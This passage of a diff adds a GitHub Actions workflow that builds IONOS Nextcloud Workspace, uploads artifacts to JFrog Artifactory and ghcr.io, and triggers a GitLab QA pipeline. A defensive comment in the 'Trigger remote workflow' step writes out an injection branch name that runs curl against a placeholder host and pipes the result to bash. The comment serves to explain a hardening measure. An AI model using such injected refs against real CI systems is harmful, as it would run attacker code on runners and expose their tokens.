+          JOB_URL="$JOB_HTML_URL"
+          if [ -n "$JOB_URL" ]; then
+            JFROG_PROPS_LIST+=("job.html_url=${JOB_URL}")
+          fi
+
+          # Join properties into a single semicolon-separated string using IFS and array expansion
+          # This bash technique temporarily sets IFS (Internal Field Separator) to ';' and expands
+          # the array with [*] which joins elements using the first character of IFS
+          JFROG_PROPS=$(IFS=';'; printf '%s' "${JFROG_PROPS_LIST[*]}")
+
+          echo ""
+          echo "Uploading to JFrog..."
+          echo "Target Path: $JFROG_PATH"
+          echo "Properties: $JFROG_PROPS"
+          echo "Running: jf rt upload \"$ARCHIVE_NAME\" \"$JFROG_PATH\" --target-props \"...\""
+
+          if jf rt upload "$ARCHIVE_NAME" "$JFROG_PATH" --target-props "$JFROG_PROPS"; then
+            echo "✅ Successfully uploaded $APP_NAME to JFrog"
+            echo ""
+            echo "Verifying upload..."
+            if jf rt s "$JFROG_PATH"; then
+              echo "✓ Upload verified - artifact is accessible in JFrog"
+            else
+              echo "⚠ Upload succeeded but verification search failed"
+            fi
+          else
+            UPLOAD_EXIT_CODE=$?
+            echo "❌ Failed to upload to JFrog (exit code: $UPLOAD_EXIT_CODE)"
+            echo "⚠️ Continuing workflow despite upload failure..."
+          fi
+
+          # Clean up archive
+          echo ""
+          echo "Cleaning up local archive..."
+          rm -f "$ARCHIVE_NAME"
+          echo "✓ Cleanup complete"
+
+      - name: Upload ${{ matrix.app_info.name }} build artifacts
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          retention-days: 1
+          name: external-app-build-${{ matrix.app_info.name }}
+          path: |
+            ${{ steps.app-config.outputs.path }}
+            !${{ steps.app-config.outputs.path }}/node_modules
+
+  build-artifact:
+    runs-on: ubuntu-latest
+    needs: [prepare-matrix, build-external-apps]
+    # Always run this job, even if build-external-apps is skipped
+    if: |
+      always() &&
+      needs.prepare-matrix.result == 'success' &&
+      (needs.build-external-apps.result == 'success' || needs.build-external-apps.result == 'skipped')
+
+    permissions:
+      contents: read
+
+    outputs:
+      NC_VERSION: ${{ steps.get_nc_version.outputs.NC_VERSION }}
+
+    name: build-artifact
+    steps:
+      - name: Checkout server
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # 7.0.0
+        with:
+          submodules: true
+          fetch-depth: 1
+
+      - name: Setup JFrog CLI
+        uses: jfrog/setup-jfrog-cli@1641575d87647fb969c0545f0b6a76873e328b7c # v5.0.0
+        env:
+          JF_URL: ${{ secrets.JF_ARTIFACTORY_URL }}
+          JF_USER: ${{ secrets.JF_ARTIFACTORY_USER }}
+          JF_ACCESS_TOKEN: ${{ secrets.JF_ACCESS_TOKEN }}
+
+      - name: Ping the JF server
+        run: |
+          # Ping the server
+          jf rt ping
+
+      - name: Restore all apps from cache and JFrog
+        # The matrix JSON blobs were interpolated into single-quoted assignments, where one
+        # apostrophe in an app name breaks out of the string. They are generated from repo
+        # files a PR author can edit.
+        env:
+          # GH_TOKEN was declared in a second env: block after the run: below. Merged here:
+          # two env: keys on one step is a YAML duplicate key, and the later one wins.
+          GH_TOKEN: ${{ github.token }}
+          HAS_APPS_TO_RESTORE: ${{ needs.prepare-matrix.outputs.has_apps_to_restore }}
+          HAS_APPS_TO_BUILD: ${{ needs.prepare-matrix.outputs.has_apps_to_build }}
+          APPS_TO_RESTORE: ${{ needs.prepare-matrix.outputs.apps_to_restore }}
+          APPS_TO_BUILD: ${{ needs.prepare-matrix.outputs.apps_to_build }}
+          FULL_MATRIX: ${{ needs.prepare-matrix.outputs.external_apps_matrix }}
+          EFFECTIVE_CACHE_VERSION: ${{ needs.prepare-matrix.outputs.effective_cache_version }}
+        run: |
+          set -euo pipefail
+
+          # Restore apps that are in cache (from apps_to_restore)
+          if [ "$HAS_APPS_TO_RESTORE" == "true" ]; then
+            echo "📦 Restoring cached apps..."
+
+            # Process each app in the restore list
+            echo "$APPS_TO_RESTORE" | jq -c '.[]' | while read -r app_json; do
+              APP_NAME=$(echo "$app_json" | jq -r '.name')
+              APP_SHA=$(echo "$app_json" | jq -r '.sha')
+              APP_PATH=$(echo "$app_json" | jq -r '.path')
+              SOURCE=$(echo "$app_json" | jq -r '.source')
+
+              echo ""
+              echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+              echo "Restoring: $APP_NAME (source: $SOURCE)"
+              echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+
+              if [ "$SOURCE" == "jfrog" ]; then
+                # Restore from JFrog
+                JFROG_PATH=$(echo "$app_json" | jq -r '.jfrog_path')
+                ARCHIVE_NAME="${APP_NAME}-${APP_SHA}.tar.gz"
+
+                echo "📥 Downloading from JFrog: $JFROG_PATH"
+
+                if jf rt download "$JFROG_PATH" "$ARCHIVE_NAME" --flat=true; then
+                  echo "✅ Downloaded successfully"
+                  echo "Extracting to $APP_PATH..."
+                  mkdir -p "$(dirname "$APP_PATH")"
+                  tar -xzf "$ARCHIVE_NAME" -C "$(dirname "$APP_PATH")"
+
+                  if [ -d "$APP_PATH" ] && [ -f "$APP_PATH/appinfo/info.xml" ]; then
+                    echo "✅ Restored $APP_NAME from JFrog"
+                  else
+                    echo "❌ Failed to extract or validate $APP_NAME"
+                    exit 1
+                  fi
+
+                  rm -f "$ARCHIVE_NAME"
+                else
+                  echo "❌ Failed to download from JFrog"
+                  exit 1
+                fi
+
+              elif [ "$SOURCE" == "github-cache" ]; then
+                # Restore from GitHub cache
+                CACHE_KEY=$(echo "$app_json" | jq -r '.cache_key')
+
+                echo "💾 Restoring from GitHub cache: $CACHE_KEY"
+
+                # Use actions/cache/restore in a way that works in a script context
+                # We need to use gh CLI to restore the cache
+                if gh cache restore "$CACHE_KEY" --key "$CACHE_KEY"; then
+                  echo "✅ Restored $APP_NAME from GitHub cache"
+
+                  # Validate restoration
+                  if [ ! -d "$APP_PATH" ] || [ ! -f "$APP_PATH/appinfo/info.xml" ]; then
+                    echo "❌ Validation failed for $APP_NAME"
+                    exit 1
+                  fi
+                else
+                  echo "❌ Failed to restore from GitHub cache"
+                  exit 1
+                fi
+              else
+                echo "❌ Unknown source: $SOURCE"
+                exit 1
+              fi
+            done
+
+            echo ""
+            echo "✅ All cached apps restored successfully"
+          fi
+
+          # Also restore newly built apps from JFrog (from apps_to_build)
+          if [ "$HAS_APPS_TO_BUILD" == "true" ]; then
+            echo ""
+            echo "📦 Restoring newly built apps from JFrog..."
+
+            # Process each app in the build list
+            echo "$APPS_TO_BUILD" | jq -c '.[]' | while read -r app_json; do
+              APP_NAME=$(echo "$app_json" | jq -r '.name')
+              APP_SHA=$(echo "$app_json" | jq -r '.sha')
+
+              # Get app path from full matrix
+              APP_PATH=$(echo "$FULL_MATRIX" | jq -r --arg name "$APP_NAME" '.[] | select(.name == $name) | .path')
+
+              if [ -z "$APP_PATH" ] || [ "$APP_PATH" == "null" ]; then
+                echo "❌ Could not find path for $APP_NAME in matrix"
+                exit 1
+              fi
+
+              echo ""
+              echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+              echo "Restoring newly built: $APP_NAME"
+              echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+
+              # Construct JFrog path matching what build-external-apps uploaded
+              JFROG_PATH="${ARTIFACTORY_REPOSITORY_SNAPSHOT}/apps/${EFFECTIVE_CACHE_VERSION}/${APP_NAME}/${APP_NAME}-${APP_SHA}.tar.gz"
+              ARCHIVE_NAME="${APP_NAME}-${APP_SHA}.tar.gz"
+
+              echo "📥 Downloading from JFrog: $JFROG_PATH"
+
+              if jf rt download "$JFROG_PATH" "$ARCHIVE_NAME" --flat=true; then
+                echo "✅ Downloaded successfully"
+                echo "Extracting to $APP_PATH..."
+                mkdir -p "$(dirname "$APP_PATH")"
+                tar -xzf "$ARCHIVE_NAME" -C "$(dirname "$APP_PATH")"
+
+                if [ -d "$APP_PATH" ] && [ -f "$APP_PATH/appinfo/info.xml" ]; then
+                  echo "✅ Restored $APP_NAME from JFrog"
+                else
+                  echo "❌ Failed to extract or validate $APP_NAME"
+                  exit 1
+                fi
+
+                rm -f "$ARCHIVE_NAME"
+              else
+                echo "❌ Failed to download from JFrog"
+                exit 1
+              fi
+            done
+
+            echo ""
+            echo "✅ All newly built apps restored from JFrog successfully"
+          fi
+
+          echo ""
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "✅ All apps restored successfully"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+
+      - name: Set up node with version from package.json's engines
+        uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # 6.4.0
+        with:
+          node-version-file: "package.json"
+          cache: ${{ github.event.inputs.force_rebuild != 'true' && 'npm' || '' }}
+
+      - name: Install Dependencies
+        run: sudo apt-get update && sudo apt-get install -y make zip unzip
+
+      - name: Print dependencies versions
+        run: make --version && node --version && npm --version
+
+      - name: Setup PHP with PECL extension
+        uses: shivammathur/setup-php@f3e473d116dcccaddc5834248c87452386958240 #v2.37.2
+        with:
+          php-version: '8.3'
+          tools: composer:v2
+          extensions: gd, zip, curl, xml, xmlrpc, mbstring, sqlite, xdebug, pgsql, intl, imagick, gmp, apcu, bcmath, redis, soap, imap, opcache
+        env:
+          runner: ubuntu-latest
+
+      - name: Cache Composer dependencies
+        if: github.event.inputs.force_rebuild != 'true'
+        uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # 6.1.0
+        with:
+          path: vendor
+          key: ${{ runner.os }}-composer-${{ hashFiles('**/composer.lock') }}
+          restore-keys: |
+            ${{ runner.os }}-composer-
+
+      - name: Print PHP install
+        run: php -i && php -m
+
+      - name: Build Nextcloud
+        run: make -f IONOS/Makefile build_ncw
+
+      - name: Add config partials
+        run: make -f IONOS/Makefile add_config_partials
+
+      # IONOS Customization: Inject build number for production traceability
+      # This is specific to IONOS Nextcloud Workspace and not part of upstream Nextcloud
+      - name: Inject build number
+        env:
+          RUN_NUMBER: ${{ github.run_number }}
+        run: |
+          echo "$RUN_NUMBER" > .buildnumber
+          echo "✅ Build number injected: ${RUN_NUMBER}"
+          echo "📄 File created: .buildnumber"
+          cat .buildnumber
+
+      - name: Zip dependencies
+        run: make -f IONOS/Makefile zip_dependencies TARGET_PACKAGE_NAME="$TARGET_PACKAGE_NAME"
+
+      - name: Get NC version
+        id: get_nc_version
+        continue-on-error: false
+        run: |
+          NC_VERSION=$(jq -r '.ncVersion' version.json)
+          echo "NC_VERSION: $NC_VERSION"
+
+          if [ -z "$NC_VERSION" ]; then
+            echo "NC_VERSION is empty"
+            exit 1
+          fi
+
+          echo "NC_VERSION=$NC_VERSION" >> $GITHUB_OUTPUT
+
+      - name: Upload artifact result for job build-artifact
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          retention-days: 30
+          name: nextcloud_workspace_build_artifact
+          path: ${{ env.TARGET_PACKAGE_NAME }}
+
+      - name: Show changes on failure
+        if: failure()
+        run: |
+          git status
+          git --no-pager diff
+          exit 1 # make it red to grab attention
+
+  upload-to-artifactory:
+    runs-on: self-hosted
+    # Upload the artifact to the Artifactory repository on PR *OR* on "ionos-dev|ionos-dev-v*|ionos-stable|ionos-stable-v*|rc/*|*/dev/*" branch push defined in the on:push:branches *OR* on manual workflow_dispatch
+    # The per-major lanes are matched by prefix so a new major (v33, v34, …) needs no edit here.
+    if: |
+      always() &&
+      (github.event_name == 'pull_request' || github.event_name == 'workflow_dispatch' || github.ref_name == 'ionos-dev' || startsWith(github.ref_name, 'ionos-dev-v') || github.ref_name == 'ionos-stable' || startsWith(github.ref_name, 'ionos-stable-v') || startsWith(github.ref_name, 'rc/') || contains(github.ref_name, '/dev/')) &&
+      needs.prepare-matrix.result == 'success' &&
+      (needs.build-external-apps.result == 'success' || needs.build-external-apps.result == 'skipped') &&
+      needs.build-artifact.result == 'success'
+
+    name: Push to artifactory
+    needs: [prepare-matrix, build-external-apps, build-artifact]
+
+    outputs:
+      ARTIFACTORY_LAST_BUILD_PATH: ${{ steps.artifactory_upload.outputs.ARTIFACTORY_LAST_BUILD_PATH }}
+
+    env:
+      BUILD_NAME: "nextcloud-workspace-snapshot"
+
+    steps:
+      # Checkout is required to access the local composite action at ./.github/actions/get-job-data
+      - name: Checkout repository
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # 7.0.0
+        with:
+          fetch-depth: 1
+
+      - name: Check prerequisites
+        env:
+          JF_URL: ${{ secrets.JF_ARTIFACTORY_URL }}
+          JF_USER: ${{ secrets.JF_ARTIFACTORY_USER }}
+          JF_ACCESS_TOKEN: ${{ secrets.JF_ACCESS_TOKEN }}
+        run: |
+          # count the number of secrets that are set
+          echo "Checking if required secrets are set..."
+          error_count=0
+
+          if [ -z "$JF_URL" ]; then
+            # output error to github actions log
+            echo "::error::JF_ARTIFACTORY_URL secret is not set"
+            error_count=$((error_count + 1))
+          fi
+
+          if [ -z "$JF_USER" ]; then
+            echo "::error::JF_ARTIFACTORY_USER secret is not set"
+            error_count=$((error_count + 1))
+          fi
+
+          if [ -z "$JF_ACCESS_TOKEN" ]; then
+            echo "::error::JF_ACCESS_TOKEN secret is not set"
+            error_count=$((error_count + 1))
+          fi
+
+          # abort if any of the required secrets are not set
+          if [ $error_count -ne 0 ]; then
+              echo "::error::Required secrets are not set. Aborting."
+              exit 1
+          fi
+
+      - name: Download artifact zip
+        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7.0.0
+        with:
+          name: nextcloud_workspace_build_artifact
+
+      # This action sets up the JFrog CLI with the Artifactory URL and access token
+      - uses: jfrog/setup-jfrog-cli@deda456d982fc5e9a7a020b63eb0d2968aedd33e # v5.1.0
+        env:
+          JF_URL: ${{ secrets.JF_ARTIFACTORY_URL }}
+          JF_USER: ${{ secrets.JF_ARTIFACTORY_USER }}
+          JF_ACCESS_TOKEN: ${{ secrets.JF_ACCESS_TOKEN }}
+
+      - name: Ping the JF server
+        run: |
+          # Ping the server
+          jf rt ping
+
+      - name: Get Job data
+        id: get_job_data
+        continue-on-error: true
+        uses: ./.github/actions/get-job-data
+        with:
+          job-name: 'Push to artifactory'
+          github-token: ${{ github.token }}
+          repository: ${{ github.repository }}
+          run-id: ${{ github.run_id }}
+
+      - name: Upload build to artifactory
+        id: artifactory_upload
+        # Context values are bound to environment variables rather than interpolated into
+        # the script — `${{ }}` expands textually before bash parses it, so an interpolated
+        # branch name is code. This job holds the JFrog credentials.
+        env:
+          REF: ${{ github.ref_name }}
+          SHA: ${{ github.sha }}
+          RUN_NUMBER: ${{ github.run_number }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
+          NC_VERSION_FULL: ${{ needs.build-artifact.outputs.NC_VERSION }}
+          JOB_HTML_URL: ${{ steps.get_job_data.outputs.job_html_url }}
+        run: |
+          # Artifactory Build Storage Structure:
+          # | Branch/Event     | Stage Prefix   | Artifact Path                                                                              |
+          # |------------------|----------------|--------------------------------------------------------------------------------------------|
+          # | Pull Request     | dev            | dev/pr/nextcloud-workspace-pr-<number>.zip                                                 |
+          # | ionos-dev        | dev            | dev/ncw-<ncVersion>/<shortSha>/nextcloud-workspace-<ncVersion>.zip                         |
+          # | ionos-dev-v*     | dev            | dev/ncw-<ncVersion>/<shortSha>/nextcloud-workspace-<ncVersion>.zip (ncVersion namespaces it) |
+          # | ionos-stable     | stable         | stable/ncw-<ncVersion>/<shortSha>/nextcloud-workspace-<ncVersion>.zip                      |
+          # | ionos-stable-v*  | stable         | stable/ncw-<ncVersion>/<shortSha>/nextcloud-workspace-<ncVersion>.zip (ncVersion namespaces it) |
+          # | rc/*             | rc             | rc/<github.ref_name>/ncw-<ncVersion>/<shortSha>/nextcloud-workspace-<ncVersion>.zip        |
+          # | */dev/*          | dev-*          | dev-<prefix>/ncw-<ncVersion>/<shortSha>/nextcloud-workspace-<ncVersion>.zip                |
+          #
+          # The dev lanes need no arm: both ionos-dev and ionos-dev-v<N> fall through to the
+          # "dev" default. The stable arm must match the suffixed form explicitly, or a future
+          # ionos-stable-v<N> would silently publish into dev/.
+
+          ARTIFACTORY_STAGE_PREFIX="dev"
+
+          # Set stage prefix based on branch. The ionos-stable-v[0-9]* glob stays unquoted on
+          # the right of [[ ]]: quoting it would make this a literal comparison and a
+          # suffixed stable lane would silently publish into dev/.
+          if [[ "$REF" == "ionos-stable" || "$REF" == ionos-stable-v[0-9]* ]]; then
+              ARTIFACTORY_STAGE_PREFIX="stable"
+          # set ARTIFACTORY_STAGE_PREFIX=rc on rc/* branches
+          elif [[ "$REF" =~ ^rc/.*$ ]]; then
+              ARTIFACTORY_STAGE_PREFIX="$REF"
+          # Extract prefix from */dev/* branches (e.g., 'ah/dev/feature' -> 'dev-ah')
+          elif [[ "$REF" =~ ^.*/dev/.*$ ]]; then
+              # Extract the part before '/dev/'
+              BRANCH_PREFIX=$(printf '%s' "$REF" | sed 's|/.*||' | sed 's/[^A-Za-z0-9._-]/-/g')
+              ARTIFACTORY_STAGE_PREFIX="dev-${BRANCH_PREFIX}"
+          fi
+
+          export PATH_TO_DIRECTORY="${ARTIFACTORY_REPOSITORY_SNAPSHOT}/${ARTIFACTORY_STAGE_PREFIX}"
+
+          # For PR: use simple pr/<number> path
+          # For branches: use ncw-<version>/<sha>/ structure to ensure unique paths
+          if [ -n "$PR_NUMBER" ]; then
+            PATH_TO_FILE="pr/nextcloud-workspace-pr-${PR_NUMBER}.zip"
+          else
+            # Extract short SHA (first 7 characters)
+            SHORT_SHA="$SHA"
+            SHORT_SHA="${SHORT_SHA:0:7}"
+            NC_VERSION="$NC_VERSION_FULL"
+
+            PATH_TO_FILE="ncw-${NC_VERSION}/${SHORT_SHA}/nextcloud-workspace-${NC_VERSION}.zip"
+          fi
+
+          export PATH_TO_LATEST_ARTIFACT="${PATH_TO_DIRECTORY}/${PATH_TO_FILE}"
+
+          # Build properties for artifact metadata
+          JFROG_PROPS_LIST=()
+          JFROG_PROPS_LIST+=("build.nc_version=${NC_VERSION_FULL}")
+          JFROG_PROPS_LIST+=("vcs.branch=${REF}")
+          JFROG_PROPS_LIST+=("vcs.revision=${SHA}")
+
+          # Add job URL if available
+          JOB_URL="$JOB_HTML_URL"
+          if [ -n "$JOB_URL" ]; then
+            JFROG_PROPS_LIST+=("job.html_url=${JOB_URL}")
+          fi
+
+          # Join properties into a single semicolon-separated string using IFS and array expansion
+          # This bash technique temporarily sets IFS (Internal Field Separator) to ';' and expands
+          # the array with [*] which joins elements using the first character of IFS
+          JFROG_PROPS=$(IFS=';'; printf '%s' "${JFROG_PROPS_LIST[*]}")
+
+          # Upload with retry logic (3 attempts with 30s delay)
+          MAX_ATTEMPTS=3
+          ATTEMPT=1
+          UPLOAD_SUCCESS=false
+          DELAY_SEC=10
+
+          while [ $ATTEMPT -le $MAX_ATTEMPTS ]; do
+            echo "Upload attempt $ATTEMPT of $MAX_ATTEMPTS..."
+
+            if jf rt upload "${TARGET_PACKAGE_NAME}" \
+              --build-name "${BUILD_NAME}" \
+              --build-number "${RUN_NUMBER}" \
+              --target-props "$JFROG_PROPS" \
+              $PATH_TO_LATEST_ARTIFACT; then
+              UPLOAD_SUCCESS=true
+              echo "✅ Upload successful on attempt $ATTEMPT"
+              break
+            else
+              echo "⚠️ Upload attempt $ATTEMPT failed"
+              if [ $ATTEMPT -lt $MAX_ATTEMPTS ]; then
+                echo "Waiting $DELAY_SEC seconds before retry..."
+                sleep $DELAY_SEC
+                DELAY_SEC=$((DELAY_SEC * 2))  # Exponential backoff: delays are 10s, then 20s (sleep occurs after failed attempts)
+              fi
+            fi
+
+            ATTEMPT=$((ATTEMPT + 1))
+          done
+
+          if [ "$UPLOAD_SUCCESS" != "true" ]; then
+            echo "❌ Upload failed after $MAX_ATTEMPTS attempts"
+            exit 1
+          fi
+
+          echo "ARTIFACTORY_LAST_BUILD_PATH=${PATH_TO_LATEST_ARTIFACT}" >> $GITHUB_OUTPUT
+
+      - name: Show changes on failure
+        if: failure()
+        run: |
+          git status
+          git --no-pager diff
+          exit 1 # make it red to grab attention
+
+  nextcloud-workspace-artifact-to-ghcr_io:
+    runs-on: ubuntu-latest
+    # Only run if build-artifact succeeded
+    if: |
+      always() &&
+      needs.prepare-matrix.result == 'success' &&
+      (needs.build-external-apps.result == 'success' || needs.build-external-apps.result == 'skipped') &&
+      needs.build-artifact.result == 'success'
+
+    permissions:
+      contents: read
+      packages: write
+
+    name: Push artifact to ghcr.io
+    needs: [prepare-matrix, build-external-apps, build-artifact]
+
+    steps:
+      - name: Download artifact zip
+        uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7.0.0
+        with:
+          name: nextcloud_workspace_build_artifact
+
+      - name: Log in to the Container registry
+        uses: docker/login-action@650006c6eb7dba73a995cc03b0b2d7f5ca915bee # 4.2.0
+        with:
+          registry: ${{ env.REGISTRY }}
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Extract metadata (tags, labels) for Docker
+        id: meta
+        uses: docker/metadata-action@80c7e94dd9b9319bd5eb7a0e0fe9291e23a2a2e9 # 6.1.0
+        with:
+          images: "${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}"
+
+      - name: Create Dockerfile
+        run: |
+          cat >Dockerfile << EOF
+          FROM busybox as builder
+          COPY ./${TARGET_PACKAGE_NAME} /
+          WORKDIR /builder
+          RUN unzip /${TARGET_PACKAGE_NAME} -d /builder
+
+          FROM scratch
+          WORKDIR /app
+          VOLUME /app
+          COPY --from=builder /builder /app
+          EOF
+
+      - name: Build and push Docker image
+        uses: docker/build-push-action@f9f3042f7e2789586610d6e8b85c8f03e5195baf # v7.2.0
+        with:
+          context: .
+          push: true
+          tags: ${{ steps.meta.outputs.tags }}
+          labels: ${{ steps.meta.outputs.labels }}
+
+      - name: Show changes on failure
+        if: failure()
+        run: |
+          echo "Git status:"
+          git status
+          echo "Git diff:"
+          git diff
+          exit 1 # make it red to grab attention
+
+  trigger-remote-dev-workflow:
+    runs-on: self-hosted
+
+    name: Trigger remote workflow
+    needs: [build-artifact, upload-to-artifactory]
+    # Trigger remote build on "ionos-dev|ionos-stable|ionos-*-v*|rc/*|*/dev/*" branch *push*
+    # defined in the on:push:branches
+    # Can be disabled via repository variable 'DISABLE_REMOTE_TRIGGER' (set to 'true' to disable)
+    # Configure at: https://github.com/IONOS-Productivity/ncw-server/settings/variables/actions
+    #
+    # NOTE (NSW-944): the Nextcloud-major freeze lives in repository *variables*, not in this
+    # condition. The per-major lanes are admitted below and then gated on
+    # REMOTE_TRIGGER_NC_VERSION, so moving the deployed major is a variable edit rather than a
+    # workflow edit. Until this change the freeze was hard-coded here as exact-equality arms.
+    #
+    # Version-gate: only trigger QA deployment for the whitelisted NC major version.
+    #   Set repository variable 'REMOTE_TRIGGER_NC_VERSION' to the deployed version (e.g. "v32").
+    #   Applies only to 'ionos-dev-v*'/'ionos-stable-v*' branches (checked by suffix); lanes for
+    #   other majors still build & push images but will NOT trigger the remote QA workflow.
+    #   Leave unset (empty) to allow all versions.
+    #   The bare 'ionos-dev'/'ionos-stable' lanes are always exempt from this gate.
+    # RC-gate: rc/* branches are NOT covered by the NC-version suffix check above — the current
+    #   train 'rc/ncw-7' encodes no major at all, and applying a suffix check to rc/* would let a
+    #   branch pass by coincidence of name. Set 'REMOTE_TRIGGER_RC_BRANCH' to the exact RC branch
+    #   that should trigger QA (e.g. "rc/ncw-7", or "rc/ncw-v32-1" in the current naming era).
+    #   Only one RC at a time; when promoting a new RC, update the variable to the new branch name.
+    # */dev/* branches bypass the version gate entirely and are controlled solely by repository
+    #   variable 'ENABLE_REMOTE_TRIGGER_USER_DEV' (default off — set to 'true' to let user dev
+    #   branches deploy to QA). They still build and still upload to Artifactory when off.
+    #
+    # Widening the gate at a cutover also requires widening the BUILD_TYPE stable arm further
+    # down; otherwise a newly-admitted ionos-stable-v<N> would deploy as BUILD_TYPE=dev.
+    if: |
+      always() &&
+      github.event_name == 'push' &&
+      (github.ref_name == 'ionos-dev' || github.ref_name == 'ionos-stable' ||
+       startsWith(github.ref_name, 'ionos-dev-v') || startsWith(github.ref_name, 'ionos-stable-v') ||
+       startsWith(github.ref_name, 'rc/') ||
+       (contains(github.ref_name, '/dev/') && vars.ENABLE_REMOTE_TRIGGER_USER_DEV == 'true')) &&
+      needs.build-artifact.result == 'success' &&
+      needs.upload-to-artifactory.result == 'success' &&
+      vars.DISABLE_REMOTE_TRIGGER != 'true' &&
+      (contains(github.ref_name, '/dev/') ||
+       github.ref_name == 'ionos-dev' || github.ref_name == 'ionos-stable' ||
+       vars.REMOTE_TRIGGER_NC_VERSION == '' ||
+       ((startsWith(github.ref_name, 'ionos-dev-v') || startsWith(github.ref_name, 'ionos-stable-v')) &&
+        endsWith(github.ref_name, vars.REMOTE_TRIGGER_NC_VERSION)) ||
+       github.ref_name == vars.REMOTE_TRIGGER_RC_BRANCH)
+    steps:
+      - name: Check prerequisites
+        # Every context value is bound to an environment variable rather than interpolated
+        # into the script below. `${{ }}` is expanded textually before bash parses the
+        # script, so an interpolated value is code, not data — see the comment on the
+        # 'Trigger remote workflow' step.
+        env:
+          REF: ${{ github.ref_name }}
+          RUN_ID: ${{ github.run_id }}
+          GITHUB_SHA_VALUE: ${{ github.sha }}
+          NC_VERSION_FULL: ${{ needs.build-artifact.outputs.NC_VERSION }}
+          ARTIFACTORY_LAST_BUILD_PATH: ${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH }}
+          GITLAB_TOKEN: ${{ secrets.GITLAB_TOKEN }}
+          GITLAB_TRIGGER_URL: ${{ secrets.GITLAB_TRIGGER_URL }}
+        run: |
+          echo "Checking if all required variables are set..."
+          error_count=0
+
+          # Check secrets
+          if [ -z "$GITLAB_TOKEN" ]; then
+            echo "::error::GITLAB_TOKEN secret is not set"
+            error_count=$((error_count + 1))
+          fi
+
+          if [ -z "$GITLAB_TRIGGER_URL" ]; then
+            echo "::error::GITLAB_TRIGGER_URL secret is not set"
+            error_count=$((error_count + 1))
+          fi
+
+          # Check required outputs from previous jobs
+          if [ -z "$NC_VERSION_FULL" ]; then
+            echo "::error::NC_VERSION output from build-artifact job is not set"
+            error_count=$((error_count + 1))
+          else
+            echo "✓ NC_VERSION: $NC_VERSION_FULL"
+          fi
+
+          if [ -z "$ARTIFACTORY_LAST_BUILD_PATH" ]; then
+            echo "::error::ARTIFACTORY_LAST_BUILD_PATH output from upload-to-artifactory job is not set"
+            error_count=$((error_count + 1))
+          else
+            echo "✓ ARTIFACTORY_LAST_BUILD_PATH: $ARTIFACTORY_LAST_BUILD_PATH"
+          fi
+
+          # Check GitHub context variables
+          if [ -z "$GITHUB_SHA_VALUE" ]; then
+            echo "::error::github.sha is not set"
+            error_count=$((error_count + 1))
+          else
+            echo "✓ GITHUB_SHA: $GITHUB_SHA_VALUE"
+          fi
+
+          if [ -z "$RUN_ID" ]; then
+            echo "::error::github.run_id is not set"
+            error_count=$((error_count + 1))
+          else
+            echo "✓ BUILD_ID: $RUN_ID"
+          fi
+
+          if [ -z "$REF" ]; then
+            echo "::error::github.ref_name is not set"
+            error_count=$((error_count + 1))
+          else
+            echo "✓ BRANCH: $REF"
+          fi
+
+          # Abort if any required variable is not set
+          if [ $error_count -ne 0 ]; then
+            echo "::error::Required variables are not set. Aborting."
+            exit 1
+          fi
+
+          echo "✅ All required variables are set"
+      - name: Trigger remote workflow
+        # Context values are bound to environment variables, never interpolated into the
+        # script. GitHub expands `${{ }}` textually before bash parses the script, so an
+        # interpolated value is *code*: a branch named
+        # 'x/dev/$(curl${IFS}-sSL${IFS}http://host/x|bash)' is a legal, pushable ref, and
+        # command substitution happens inside double quotes too. This job runs on a
+        # persistent self-hosted runner with GITLAB_TOKEN in scope, so the blast radius of
+        # one interpolated ref name is code execution on that runner with those creds.
+        # Bound as env, the same branch name is inert text.
+        env:
+          REF: ${{ github.ref_name }}
+          REPO: ${{ github.repository }}
+          RUN_ID: ${{ github.run_id }}
+          GITHUB_SHA_VALUE: ${{ github.sha }}
+          NC_VERSION_FULL: ${{ needs.build-artifact.outputs.NC_VERSION }}
+          ARTIFACTORY_LAST_BUILD_PATH: ${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH }}
+          GITLAB_TOKEN: ${{ secrets.GITLAB_TOKEN }}
+          GITLAB_TRIGGER_URL: ${{ secrets.GITLAB_TRIGGER_URL }}
+        run: |
+          # Enable command echo for debugging the branch routing below. Turned off again
+          # before the curl, so the request line and its --form values stay out of the log.
+          set -x
+
+          # Branch to GitLab Trigger Mapping:
+          # | ref_name         | GITLAB_REF   | BUILD_TYPE  |
+          # |------------------|--------------|-------------|
+          # | ionos-dev        | main         | dev         |
+          # | ionos-dev-v*     | main         | dev         |
+          # | ionos-stable     | main         | stable      |
+          # | ionos-stable-v*  | main         | stable      |
+          # | rc/*             | main         | rc          |
+          # | */dev/*          | main         | dev-*       |
+          #
+          # BUILD_TYPE only says which lane a build came from — which major it carries is
+          # NC_MAJOR below, so the per-major lanes share their unsuffixed lane's BUILD_TYPE.
+          # The ref name is forwarded verbatim as well, so the downstream release report can
+          # name the exact RC or branch and link back to it.
+          #
+          # GITLAB_REF stays 'main' for every lane and BUILD_TYPE keeps its existing values —
+          # both are consumed on the GitLab side, so changing either needs a coordinated change
+          # there first. NC_MAJOR below is additive and cannot break an existing consumer.
+
+          BUILD_TYPE="dev"
+
